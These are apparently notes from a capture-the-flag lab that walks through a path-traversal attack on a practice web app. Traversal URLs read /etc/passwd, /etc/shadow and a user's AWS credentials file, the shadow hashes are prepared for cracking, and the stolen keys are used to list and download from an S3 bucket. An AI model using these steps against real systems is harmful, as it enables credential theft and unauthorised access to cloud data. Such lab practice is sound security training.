https://pwnedlabs.io/labs/path-traversal-to-aws-credentials-to-s3

Nmap scan and fuzz directories for the target.

Manual directory traversal outputs the following Flask error:
```bash
"The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again."
```

Inspecting the source code reveals a bucket:
```bash
https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/
```

Fuzz for directories:
```bash
feroxbuster -k -u http://13.50.73.5/ -w /opt/lists/seclists/Discovery/Web-Content/raft-large-directories.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json -t 200
	login
	signup
	download
	profile
```

Register a test account. Then capture the http request to download invoices and try directory traversals (works)
```bash
http://13.50.73.5/download?file=../../../../etc/passwd
http://13.50.73.5/download?file=../../../../etc/shadow
unshadow passwd shadow > unshadowed
```

Use BurpSuite to directory traverse without downloading and find AWS credentials:
```bash
/download?file=../../../../home/nedf/.aws/credentials
```

Using the AWS credentials, enumerate the bucket
```bash
aws configure --profile nedf
curl -I https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com
	eu-north-1
aws sts get-caller-identity --profile nedf
aws s3 ls huge-logistics-bucket --profile nedf
	flag.txt
```

Enuermated the flag. Now download it:
```bash
aws s3 cp s3://huge-logistics-bucket/flag.txt . --profile nedf
```

![[Pasted image 20260604143901.png]]